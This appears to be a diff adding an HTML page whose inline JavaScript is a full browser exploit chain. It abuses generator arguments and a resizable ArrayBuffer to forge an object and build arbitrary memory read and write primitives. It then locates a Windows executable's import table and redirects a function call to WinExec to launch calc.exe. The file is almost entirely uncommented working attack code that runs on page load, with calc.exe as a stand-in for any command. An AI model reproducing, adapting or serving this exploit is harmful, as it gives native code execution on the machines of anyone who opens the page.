@@ -1,0 +1,72 @@
+<!doctype html><html><body><div id="out">running</div><script>
+"use strict";
+var K;
+var rab=new ArrayBuffer(1,{maxByteLength:120});
+var view=new Uint8Array(rab);
+var pins=[];
+for(var pi=0;pi<4;pi++)pins.push(new ArrayBuffer(120));
+function w16(o,x){view[o]=x&255;view[o+1]=(x>>>8)&255}
+function w32(o,x){for(var i=0;i<4;i++)view[o+i]=Number((BigInt(x)>>BigInt(i*8))&255n)}
+function w64(o,x){for(var i=0;i<8;i++)view[o+i]=Number((x>>BigInt(i*8))&255n)}
+function r64v(o){var x=0n;for(var i=0;i<8;i++)x|=BigInt(view[o+i])<<BigInt(i*8);return x}
+function mk(){function* g(a=(pins.push(new ArrayBuffer(120)),K=()=>arguments)){arguments[0]=yield 1;yield 2}var it=g();it.next();it.next(it)}
+mk();
+var junk=new ArrayBuffer(2000000);
+rab.resize(120);
+view.fill(0);
+junk=null;
+w16(18,1);
+var fake=K();
+var keep1=fake;
+var keep2=fake;
+var holder={a:fake,b:fake,c:fake,d:fake};
+var weak=new WeakRef(fake);
+var record=r64v(40);
+w16(18,24);
+w32(64,4096);
+function read8(address){w64(56,address);return fake[0]}
+function read64(address){var x=0n;for(var i=0;i<8;i++)x|=BigInt(read8(address+BigInt(i)))<<BigInt(i*8);return x}
+var weakData=read64(record+16n);
+var fakeAddress=read64(weakData);
+function restoreTyped(){view[16]=16;w16(18,24);w64(48,fakeAddress+72n);w64(88,fakeAddress+104n);w64(96,fakeAddress+40n);w32(64,4096);view[113]=0}
+function leakValue(value){view.fill(0,72,88);view[16]=16;w16(18,2);w64(56,fakeAddress+72n);w32(64,1);fake[0]=value;var address=r64v(72);fake[0]=0;restoreTyped();return address}
+var nativeObject=leakValue(String.fromCharCode);
+function write8(address,value){w64(56,address);fake[0]=value}
+function read32(address){return read8(address)|(read8(address+1n)<<8)|(read8(address+2n)<<16)|(read8(address+3n)<<24)}
+function read16(address){return read8(address)|(read8(address+1n)<<8)}
+function readAscii(address,limit){var result="";for(var i=0;i<limit;i++){var c=read8(address+BigInt(i));if(!c)break;result+=String.fromCharCode(c)}return result}
+function findImport(base,name){var pe=BigInt(read32(base+60n)>>>0);var optional=base+pe+24n;var directory=optional+(read16(optional)===523?112n:96n);var imports=read32(directory+8n)>>>0;for(var d=0;d<128&&imports;d++){var descriptor=base+BigInt(imports+d*20);var original=read32(descriptor)>>>0;var dllName=read32(descriptor+12n)>>>0;var first=read32(descriptor+16n)>>>0;if(!original&&!dllName&&!first)break;var names=original||first;for(var i=0;i<2048;i++){var entry=read64(base+BigInt(names)+BigInt(i*8));if(!entry)break;if(entry>>63n)continue;var importedName=readAscii(base+(entry&4294967295n)+2n,128);if(importedName===name)return read64(base+BigInt(first)+BigInt(i*8))}}return 0n}
+function write64(address,value){for(var i=0;i<8;i++)write8(address+BigInt(i),Number((value>>BigInt(i*8))&255n))}
+write8(fakeAddress-4n,255);
+write8(fakeAddress-3n,255);
+write8(fakeAddress-2n,255);
+write8(fakeAddress-1n,63);
+function pinObject(value){var address=leakValue(value);write8(address-4n,255);write8(address-3n,255);write8(address-2n,255);write8(address-1n,63)}
+pinObject(K);
+pinObject(weak);
+pinObject(rab);
+pinObject(view);
+var nativeFunction=read64(nativeObject+56n);
+var imageBase=nativeFunction&~65535n;
+for(var page=0;page<4096;page++,imageBase-=65536n){if((read32(imageBase)&65535)!==23117)continue;var peOffset=BigInt(read32(imageBase+60n)>>>0);if(peOffset<4096n&&read32(imageBase+peOffset)===17744)break}
+var target=findImport(imageBase,"WinExec");
+if(!target)throw new Error("import");
+var message="calc.exe\0";
+var messageAddress=leakValue(message)+24n;
+var donor=[0,0,0,0];
+var donorAddress=leakValue(donor);
+var closureRecord=read64(donorAddress+56n);
+write64(donorAddress+56n,0n);
+write64(donorAddress+64n,0n);
+write64(closureRecord,0n);
+write64(closureRecord+8n,0n);
+write64(closureRecord+16n,messageAddress);
+write64(closureRecord+24n,target);
+var launch=Object.create(null);
+var launchAddress=leakValue(launch);
+write8(launchAddress+18n,16);
+write8(launchAddress+19n,0);
+write64(launchAddress+48n,closureRecord);
+launch=null;
+document.getElementById("out").textContent="done";
+</script></body></html>
